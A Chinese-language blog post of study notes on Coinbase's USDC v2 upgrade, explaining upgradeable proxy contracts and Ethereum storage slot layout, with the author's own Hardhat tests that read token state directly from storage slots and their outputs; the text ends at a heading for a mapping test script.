<p><a href="https://blog.coinbase.com/usdc-v2-upgrading-a-multi-billion-dollar-erc-20-token-b57cd9437096">USDC v2: Upgrading a multi-billion dollar ERC-20 token</a> 学习记录大部分机翻+自己进行demo测试</p>
<h1>usdc升级前的状况：</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>市值很大</p>
</li>
<li class="lvl-2">
<p>是defi中被广泛使用的稳定币</p>
</li>
<li class="lvl-2">
<p>erc20代币最初在2018年部署在eth链上，运行了两年</p>
</li>
<li class="lvl-2">
<p>有个问题：为了使用usdc，你还需要 ETH 来支付交易费用</p>
</li>
</ul>
<p>综上，usdc需要安全地进行升级</p>
<h1>可升级的智能合约:</h1>
<p>从技术上讲，部署在以太坊上的智能合约是不可变的。虽然这个属性对于完全去信任的应用程序是必要的，但需要注意的是，一旦代码提交到区块链上，代码中的错误或安全缺陷就无法被纠正。</p>
<p>在以太坊上，代理模式可以用作此限制的解决方法。</p>
<p><strong>代理合约模式的总体思路是让用户与代理合约交互，代理合约将所有函数调用转发到包含实际逻辑的执行合约。</strong></p>
<p>执行合约可以被替换，这使得合约“可升级”。代理合约可以通过使用称为 <code>DELEGATECALL</code> 的特殊以太坊操作码来构建。此操作码允许合约从另一个合约借用和执行代码，同时保留调用合约的上下文，例如存储和调用者 ( <code>msg.sender</code> )。使用这个操作码和一个<code>回退函数</code>来捕获任意函数调用，代理合约可以将合约状态保存在其存储中，并且单独的执行合约可以包含逻辑。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220629203321.png" alt="20220629203321" /></p>
<p>代理合约包含一个存储执行合约地址的变量，回退函数将函数调用中继到该执行合约去。要升级合约，合约的管理员可以简单地部署一个新的执行合约并更新代理合约中的执行合约地址，使其指向新部署的合约。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220629203508.png" alt="20220629203508" /></p>
<p>乍一看，上述升级过程可能显得微不足道。但是，如果在设计替换执行合约时不特别注意，可能会发生严重的数据丢失和意外行为。有两个重要因素需要考虑：</p>
<ol>
<li class="lvl-3">
<p>状态变量在合约存储中的布局方式</p>
</li>
<li class="lvl-3">
<p>合约状态变量存储在代理合约里而不是在执行合约里。</p>
</li>
</ol>
<h1>存储槽Storage Slots:</h1>
<p>在以太坊中，智能合约的状态变量从位置零开始，按顺序排列在存储槽中。有一些<a href="https://docs.soliditylang.org/en/v0.7.4/internals/layout_in_storage.html">复杂的规则</a>可以确定不同类型和大小的状态值的存储槽位置，但<strong>一般来说，这些存储槽是按照代码中声明变量的顺序分配的</strong>。</p>
<p>让我们考虑以下示例：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>合约<code>Foo</code>有两个状态变量，称为<code>alpha</code>和<code>bravo</code></p>
</li>
<li class="lvl-2">
<p>合约<code>Bar</code>有一个状态变量<code>charlie</code></p>
</li>
<li class="lvl-2">
<p>合约<code>Baz</code>有两个状态变量<code>delta</code>和<code>echo</code></p>
</li>
<li class="lvl-2">
<p><code>Baz</code>是要部署在区块链上的合约。</p>
</li>
</ul>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220629203902.png" alt="20220629203902" /></p>
<p>由于<code>Baz</code>按顺序从<code>Foo</code>和<code>Bar</code>继承，因此<code>Baz</code>最终有 5 个状态变量，按以下顺序声明：<code>alpha</code>、<code>bravo</code>、<code>charlie</code>、<code>delta</code>和<code>echo</code>。然后，五个变量会被分配到位置 0 到 4 的存储槽。</p>
<p>现在，如果我要更新代码并向合约<code>Bar</code>添加一个名为<code>foxtrot</code>的新状态变量，变量的顺序和相应的存储槽位置将会改变。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220629204157.png" alt="20220629204157" /></p>
<p>如上图所示，此更改会导致存储插槽错位。如果我用这个新合约替换执行合约，那么状态变量<code>foxtrot</code>将位于位置 3，<code>delta</code>位于位置 4，<code>echo</code>位于位置 5。这会导致新变量<code>foxtrot</code>在升级后，<code>delta</code> 具有<code>echo</code>的值，它甚至不是相同的数据类型，并且<code>echo</code>失去它的值。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220630171029.png" alt="20220630171029" /></p>
<p>在上面的示例中，新变量不是修改现有合约<code>Bar</code> ，而是作为<code>Baz</code>继承的名为<code>Qux</code>合约的新父代的一部分引入。不幸的是，这会导致存储插槽位置出现相同的错位。</p>
<p>此处避免存储槽错位的正确方法是在<code>echo</code>之后在<code>Baz</code>中引入新的状态变量，或者在继承自<code>Baz</code>的新合约中引入。</p>
<blockquote>
<p>意思就是要按顺序，只能在<code>Baz</code>之后，不能在它之前</p>
</blockquote>
<p>除了仔细枚举所有声明的状态变量并确保顺序不会改变之外，还有其他方法可以避免这个问题。一种简单的方法是专用一个合约来保存所有状态变量，并让所有其他合约继承它。另一种方法是使用映射来包装状态变量，以便<a href="https://docs.soliditylang.org/en/v0.6.1/miscellaneous.html#mappings-and-dynamic-arrays">字段的名称在存储槽的派生中发挥作用</a>。最后，还可以使用 EVM 操作码<code>SLOAD</code>和<code>SSTORE</code>直接指定存储槽。</p>
<p><code>sload-sstore-example.sol</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract <span class="title class_">Foo</span> &#123;</span><br><span class="line">    bytes32 private constant <span class="variable constant_">NUM_SLOT</span> = <span class="title function_">keccak256</span>(<span class="string">&quot;Foo.num&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">num</span>(<span class="params"></span>) public view returns (uint256 val) &#123;</span><br><span class="line">        bytes32 slot = <span class="variable constant_">NUM_SLOT</span>;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            val := <span class="title function_">sload</span>(slot) <span class="comment">// 读取</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setNum</span>(<span class="params">uint256 val</span>) public &#123;</span><br><span class="line">        bytes32 slot = <span class="variable constant_">NUM_SLOT</span>;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="title function_">sstore</span>(slot, val) <span class="comment">// 修改</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没有单一的最佳解决方案，因为每种方法都有缺点，例如合约规模增加、gas 成本增加或代码更复杂。</p>
<p>如果您正在开始一个新项目，我建议您查看较新的设计模式，例如<a href="https://eips.ethereum.org/EIPS/eip-2535">EIP-2535 Diamond 标准</a>，这些模式在创建时考虑了<strong>可升级性和可组合性</strong>。</p>
<h1>测试存储槽：</h1>
<p>在 USDC v2 的情况下，存储槽的意外更改可能导致超过 10 亿美元的资金损失。这无疑会对我们的用户对协议的信任造成无法弥补的损害。因此，开发 v2 升级的第一个任务是<strong>创建一个单元测试</strong>，以验证是否保留了原始存储插槽。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220629204827.png" alt="20220629204827" /></p>
<p>上表描述了<code>USDC v1</code>存储中各种状态变量的布局方式。要读取特定插槽位置的存储，您可以使用<code>web3.eth.getStorageAt (web3.js)</code> 或<code>provider.getStorageAt (ethers)</code>，它以十六进制格式返回存储插槽的内容，去掉前面的零。</p>
<h2 id="测试单个存储槽：">测试单个存储槽：</h2>
<p><code>testing-storage-slot-0.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这段测试用例，试着从存储槽中读取第一个变量owner address</span></span><br><span class="line"><span class="comment">// Storage slot 0 contains &quot;owner&quot; (address)</span></span><br><span class="line"><span class="keyword">const</span> data = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// Take the last 20 bytes, left-pad with zeros if needed</span></span><br><span class="line"><span class="keyword">const</span> ownerData = data.<span class="title function_">slice</span>(-<span class="number">40</span>).<span class="title function_">padStart</span>(<span class="number">40</span>, <span class="string">&quot;0&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="title function_">expect</span>(ownerData).<span class="property">to</span>.<span class="title function_">equal</span>(</span><br><span class="line">  ownerAddress.<span class="title function_">slice</span>(<span class="number">2</span>).<span class="title function_">toLowerCase</span>() <span class="comment">// Remove &quot;0x&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<h2 id="测试共享存储槽：">测试共享存储槽：</h2>
<p><strong>小于 32 字节的多个相邻状态变量可以共享一个存储槽</strong>，从低位字节开始（右对齐）。例如，USDC 中的存储槽 1 和 8 包含地址和布尔值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 这段测试用例，试着从共享一个存储槽中的两个布尔值pauser和paused</span></span><br><span class="line"><span class="comment">// Storage slot 1 contains &quot;pauser&quot; (bool) and &quot;paused&quot; (address)</span></span><br><span class="line"><span class="keyword">const</span> data = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">const</span> pauserData = data.<span class="title function_">slice</span>(-<span class="number">40</span>);       <span class="comment">// Take the last 20 bytes</span></span><br><span class="line"><span class="keyword">const</span> pausedData = data.<span class="title function_">slice</span>(-<span class="number">42</span>, -<span class="number">40</span>);  <span class="comment">// Take 1 byte before that</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">expect</span>(pauserData).<span class="property">to</span>.<span class="title function_">equal</span>(pauserAddress.<span class="title function_">slice</span>(<span class="number">2</span>).<span class="title function_">toLowerCase</span>());</span><br><span class="line"><span class="title function_">expect</span>(!!<span class="built_in">parseInt</span>(pausedData, <span class="number">16</span>)).<span class="property">to</span>.<span class="title function_">equal</span>(paused); <span class="comment">// Convert to boolean</span></span><br></pre></td></tr></table></figure>
<h2 id="测试字符串：">测试字符串：</h2>
<p>最多 31 个字节长的字符串在存储槽中编码，文本存储在高位字节（左对齐）中，其长度 × 2 存储在低位字节中。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Storage slot 4 contains &quot;name&quot; (string)</span></span><br><span class="line"><span class="keyword">const</span> data = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">const</span> len2 = <span class="built_in">parseInt</span>(data.<span class="title function_">slice</span>(-<span class="number">2</span>), <span class="number">16</span>); <span class="comment">// Last 1 byte = length * 2</span></span><br><span class="line"><span class="comment">// Read the text (skip &quot;0x&quot;)</span></span><br><span class="line"><span class="keyword">const</span> text = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(data.<span class="title function_">slice</span>(<span class="number">2</span>, <span class="number">2</span> + len2), <span class="string">&quot;hex&quot;</span>).<span class="title function_">toString</span>(<span class="string">&quot;utf8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">expect</span>(text).<span class="property">to</span>.<span class="title function_">equal</span>(name);</span><br></pre></td></tr></table></figure>
<h2 id="测试mapping：">测试mapping：</h2>
<p>从合约存储中读取映射有点棘手。由于映射没有预定义的大小，因此映射中每个值的槽位置通过执行键 ( k ) 的 Keccak-256 散列与映射的主存储槽位置 ( p ) ( keccak256( k . p) )。主存储插槽留空，不保存任何数据。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220630130540.png" alt="20220630130540" /></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Storage slot 9 contains &quot;balances&quot; (mapping(address =&gt; uint256))</span></span><br><span class="line"><span class="comment">// Derive slot position for the key k</span></span><br><span class="line"><span class="keyword">const</span> k = holderAddr.<span class="title function_">slice</span>(<span class="number">2</span>).<span class="title function_">toLowerCase</span>().<span class="title function_">padStart</span>(<span class="number">64</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p = <span class="string">&quot;9&quot;</span>.<span class="title function_">padStart</span>(<span class="number">64</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> valueSlotPos = web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;0x&quot;</span> + k + p);</span><br><span class="line"><span class="keyword">const</span> data = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(contract.<span class="property">address</span>, valueSlotPos);</span><br><span class="line"></span><br><span class="line"><span class="title function_">expect</span>(<span class="keyword">new</span> <span class="title function_">BN</span>(data.<span class="title function_">slice</span>(<span class="number">2</span>), <span class="number">16</span>).<span class="title function_">eq</span>(expectedBalance)).<span class="property">to</span>.<span class="property">be</span>.<span class="property">true</span>;</span><br></pre></td></tr></table></figure>
<p>强烈建议所有可升级的智能合约项目都包括一个存储槽测试，因为它让开发人员有信心对代码库进行大量更改，而不会造成意外数据丢失的风险。</p>
<h1>在“产品”中进行测试：</h1>
<p><strong>单元测试有助于捕捉代码中的潜在错误，USDC v2 拥有 100% 的测试覆盖率。但是，单元测试并不能完全复制生产环境，手动测试仍然很有价值。</strong></p>
<p>介绍如何使用<code>Ganache</code>启动以太坊主网的本地分叉进行测试，也就是本地模拟了真实环境，还能继续使用uniswap等应用程序的前端进行测试。</p>
<h1>升级合约：</h1>
<p>如果升级后发现问题，技术上可以通过<strong>将执行合约设置回原始地址来回滚</strong>。</p>
<p>但是，升级失败导致的任何停机都可能对用户造成严重的经济损失，并且能够恢复还取决于失败的升级没有破坏原始合约。</p>
<p>解决我们担忧的方法当然是更多的代码：<a href="https://github.com/centrehq/centre-tokens/blob/master/contracts/v2/upgrader/V2Upgrader.sol">升级合约</a>。</p>
<p>升级 USDC 合约，对其进行初始化，运行各种测试以确保一切按预期工作，并在一切正常后自毁。这一切都在一个<strong>原子事务</strong>中完成，如果检测到问题，它会回滚整个升级过程，就好像什么都没发生一样。换句话说，无论升级结果如何，停机时间为零。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220630132957.png" alt="20220630132957" /></p>
<h1>交易确认：</h1>
<p>传奇的结局有些虎头蛇尾：在交易提交后的几秒钟内，Etherscan中出现了一个绿色的复选标记，USDC 智能合约稳定运行着。升级完成，资金安全。</p>
<blockquote>
<p>主要收获是，一小群工程师可以安全地升级价值 10 亿美元的全球金融服务，且停机时间为零。这在传统金融系统中是前所未有的，它是这项新技术真正强大的一个完美例子。</p>
</blockquote>
<h1>存储槽Demo测试：</h1>
<p>自己<a href="https://github.com/jerrychan807/my-awesome-solidity/tree/main/storage_slot_demo">demo测试</a>一下怎么列出和读取存储槽的内容</p>
<h2 id="列出存储槽：">列出存储槽：</h2>
<p>可使用插件<a href="https://github.com/aurora-is-near/hardhat-storage-layout">hardhat-storage-layout</a><br />
，具体使用方法见其文档。<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220630095108.png" alt="20220630095108" /></p>
<h2 id="测试单个存储槽：-2">测试单个存储槽：</h2>
<p>测试totalSupply，在存储槽的位置2</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220630172149.png" alt="20220630172149" /></p>
<h3 id="测试脚本：">测试脚本：</h3>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&quot;test single storage slot&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;<span class="title class_">Token</span>, users, tokenOwner&#125; = <span class="keyword">await</span> <span class="title function_">setup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Returns the Bytes32 value of the position pos at address addr</span></span><br><span class="line">    <span class="comment">// 1. 从存储槽中取值</span></span><br><span class="line">    <span class="keyword">const</span> totalSupplyDataBytes32 = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getStorageAt</span>(<span class="title class_">Token</span>.<span class="property">address</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;totalSupplyDataBytes32: &#x27;</span> + totalSupplyDataBytes32);</span><br><span class="line">    <span class="comment">// 2. decode存储槽中的值</span></span><br><span class="line">    <span class="keyword">let</span> totalSupplyDecode = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="property">interface</span>.<span class="title function_">decodeFunctionResult</span>(<span class="string">&quot;totalSupply&quot;</span>, totalSupplyDataBytes32);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(totalSupplyDecode)</span><br><span class="line">    <span class="comment">// [ BigNumber &#123; _hex: &#x27;0x3635c9adc5dea00000&#x27;, _isBigNumber: true &#125; ]</span></span><br><span class="line">    <span class="keyword">const</span> totalSupplyString = totalSupplyDecode[<span class="number">0</span>].<span class="title function_">toString</span>()</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;totalSupplyString: &#x27;</span> + totalSupplyString);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> queryTotalSupply = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">totalSupply</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;queryTotalSupply: &#x27;</span> + queryTotalSupply);</span><br><span class="line">    <span class="comment">// 3. 与从合约查询出来的值进行比较</span></span><br><span class="line">    <span class="title function_">expect</span>(queryTotalSupply).<span class="property">to</span>.<span class="title function_">equal</span>(totalSupplyString);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>
<h3 id="测试结果：-6">测试结果：</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 从存储槽中取值</span></span><br><span class="line">totalSupplyDataBytes32: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000</span><br><span class="line"><span class="comment"># decode存储槽中的值</span></span><br><span class="line">totalSupplyString: 1000000000000000000000</span><br><span class="line"><span class="comment"># 查询合约totalSupply</span></span><br><span class="line">queryTotalSupply: 1000000000000000000000</span><br></pre></td></tr></table></figure>
<h2 id="测试一个共享存储槽：">测试一个共享存储槽：</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220630104910.png" alt="20220630104910" /></p>
<p>编号5存储槽中存储了相邻状态变量：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">address public ownerAddress;</span><br><span class="line">uint8  private _decimals = <span class="number">18</span>;</span><br><span class="line">bool public pauseable = <span class="literal">false</span>;</span><br><span class="line">bool public isAdmin = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p>小于 32 字节的多个相邻状态变量可以共享一个存储槽，从低位字节开始（右对齐）。</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220630113434.png" alt="20220630113434" /></p>
<h3 id="测试脚本：-2">测试脚本：</h3>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&quot;test shared storage slot&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;<span class="title class_">Token</span>, users, tokenOwner&#125; = <span class="keyword">await</span> <span class="title function_">setup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Returns the Bytes32 value of the position pos at address addr</span></span><br><span class="line">    <span class="comment">// 1. 从存储槽中查询</span></span><br><span class="line">    <span class="keyword">const</span> slotNum = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> storageData = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getStorageAt</span>(<span class="title class_">Token</span>.<span class="property">address</span>, slotNum);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;slotNum: &#x27;</span> + slotNum + <span class="string">&#x27;storageData: &#x27;</span> + storageData);</span><br><span class="line">    <span class="comment">// 2.按偏移量取值并格式化</span></span><br><span class="line">    <span class="comment">// 右对齐，从右边开始往左取值</span></span><br><span class="line">    <span class="keyword">const</span> storageOwnerAddress = storageData.<span class="title function_">slice</span>(-<span class="number">40</span>);       <span class="comment">// Take the last 20 bytes</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;storageOwnerAddress: &quot;</span> + storageOwnerAddress);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> decimalsData = storageData.<span class="title function_">slice</span>(-<span class="number">42</span>, -<span class="number">40</span>);  <span class="comment">// Take 1 byte before that</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;decimalsData: &quot;</span> + decimalsData);</span><br><span class="line">    <span class="keyword">const</span> decimalsInt = <span class="built_in">parseInt</span>(decimalsData, <span class="number">16</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;decimalsInt: &quot;</span> + decimalsInt);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> pauseableData = storageData.<span class="title function_">slice</span>(-<span class="number">44</span>, -<span class="number">42</span>);  <span class="comment">// Take 1 byte before that</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pauseableData: &quot;</span> + pauseableData);</span><br><span class="line">    <span class="keyword">const</span> pauseableBoolean = <span class="title class_">Boolean</span>(<span class="built_in">parseInt</span>(pauseableData, <span class="number">16</span>));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pauseableBoolean: &quot;</span> + pauseableBoolean);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> isAdminData = storageData.<span class="title function_">slice</span>(-<span class="number">46</span>, -<span class="number">44</span>);  <span class="comment">// Take 1 byte before that</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;isAdminData: &quot;</span> + isAdminData);</span><br><span class="line">    <span class="keyword">const</span> isAdminDataBoolean = <span class="title class_">Boolean</span>(<span class="built_in">parseInt</span>(isAdminData, <span class="number">16</span>));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;isAdminDataBoolean: &quot;</span> + isAdminDataBoolean);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> ownerAddress = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">ownerAddress</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Query Token address: &quot;</span> + ownerAddress);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> queryDecimal = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">decimals</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;queryDecimal: &quot;</span> + queryDecimal);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> queryPauseable = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">pauseable</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;queryPauseable: &quot;</span> + queryPauseable);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> queryIsAdmin = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">isAdmin</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;queryIsAdmin: &quot;</span> + queryIsAdmin);</span><br><span class="line">    <span class="comment">// 3. 与从合约查询出来的值进行比较</span></span><br><span class="line">    <span class="title function_">expect</span>(storageOwnerAddress).<span class="property">to</span>.<span class="title function_">equal</span>(ownerAddress.<span class="title function_">slice</span>(<span class="number">2</span>).<span class="title function_">toLowerCase</span>());</span><br><span class="line">    <span class="title function_">expect</span>(queryDecimal).<span class="property">to</span>.<span class="title function_">equal</span>(decimalsInt);</span><br><span class="line">    <span class="title function_">expect</span>(queryPauseable).<span class="property">to</span>.<span class="title function_">equal</span>(pauseableBoolean);</span><br><span class="line">    <span class="title function_">expect</span>(queryIsAdmin).<span class="property">to</span>.<span class="title function_">equal</span>(isAdminDataBoolean);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="测试结果">测试结果:</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">slotNum: 5 storageData: 0x000000000000000000010012f39fd6e51aad88f6f4ce6ab8827279cfffb92266</span><br><span class="line">storageOwnerAddress: f39fd6e51aad88f6f4ce6ab8827279cfffb92266</span><br><span class="line">decimalsData: 12</span><br><span class="line">decimalsInt: 18</span><br><span class="line"></span><br><span class="line">pauseableData: 00</span><br><span class="line">pauseableBoolean: <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">isAdminData: 01</span><br><span class="line">isAdminDataBoolean: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">Query Token address: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266</span><br><span class="line">queryDecimal: 18</span><br><span class="line">queryPauseable: <span class="literal">false</span></span><br><span class="line">queryIsAdmin: <span class="literal">true</span></span><br><span class="line">    ✔ <span class="built_in">test</span> shared storage slot (1357ms)</span><br></pre></td></tr></table></figure>
<p>为了测试方便才把两个布尔值可进行设置为<code>public</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">bool public pauseable = <span class="literal">false</span>;</span><br><span class="line">bool public isAdmin = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p>如果可见性改成状态变量的默认可见性：<code>internal</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">bool pauseable = <span class="literal">false</span>; <span class="comment">// 状态变量的默认可见性：internal</span></span><br><span class="line">bool isAdmin = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure>
<p>这样就无法从外部获取到这两个状态变量，但仍然可以从存储槽中读取到这两个状态变量的数据。</p>
<h2 id="测试字符串：-2">测试字符串：</h2>
<p>最多 31 个字节长的字符串在存储槽中编码，文本存储在高位字节（左对齐）中，其长度 × 2 存储在低位字节中。</p>
<h3 id="测试脚本：-3">测试脚本：</h3>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&quot;test string storage slot&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;<span class="title class_">Token</span>, users, tokenOwner&#125; = <span class="keyword">await</span> <span class="title function_">setup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 从存储槽中位置3读取_name</span></span><br><span class="line">    <span class="keyword">const</span> slotNum = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> storageData = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getStorageAt</span>(<span class="title class_">Token</span>.<span class="property">address</span>, slotNum);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;slotNum: &#x27;</span> + slotNum + <span class="string">&#x27; storageData: &#x27;</span> + storageData);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> len2 = <span class="built_in">parseInt</span>(storageData.<span class="title function_">slice</span>(-<span class="number">2</span>), <span class="number">16</span>); <span class="comment">// Last 1 byte = length * 2</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;len2: &#x27;</span> + len2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.按偏移量取值并格式化</span></span><br><span class="line">    <span class="comment">// Read the text (skip &quot;0x&quot;)</span></span><br><span class="line">    <span class="keyword">const</span> nameText = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(storageData.<span class="title function_">slice</span>(<span class="number">2</span>, <span class="number">2</span> + len2), <span class="string">&quot;hex&quot;</span>).<span class="title function_">toString</span>(<span class="string">&quot;utf8&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;nameText: &#x27;</span> + nameText);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 与从合约查询出来的值进行比较</span></span><br><span class="line">    <span class="keyword">const</span> queryName = <span class="keyword">await</span> <span class="title class_">Token</span>.<span class="title function_">name</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;queryName: &quot;</span> + queryName);</span><br><span class="line">    <span class="title function_">expect</span>(nameText).<span class="property">to</span>.<span class="title function_">equal</span>(queryName);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="测试结果：-7">测试结果：</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">slotNum: 3 storageData: 0x4a546f6b656e000000000000000000000000000000000000000000000000000c</span><br><span class="line">len2: 12</span><br><span class="line">nameText: JToken</span><br><span class="line">queryName: JToken</span><br><span class="line">    ✔ <span class="built_in">test</span> string storage slot (1284ms)</span><br><span class="line">  1 passing (1s)</span><br><span class="line"></span><br><span class="line">✨  Done <span class="keyword">in</span> 5.39s.</span><br></pre></td></tr></table></figure>
<h2 id="测试mapping：-2">测试mapping：</h2>
<p>由于映射没有预定义的大小，因此映射中每个值的槽位置通过执行键 ( k ) 的 Keccak-256 散列与映射的主存储槽位置 ( p ) ( keccak256( k . p) )。主存储插槽留空，不保存任何数据。</p>
<p>举例示例图：<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220630130540.png" alt="20220630130540" /></p>
<h3 id="测试脚本：-4">测试脚本：</h3>
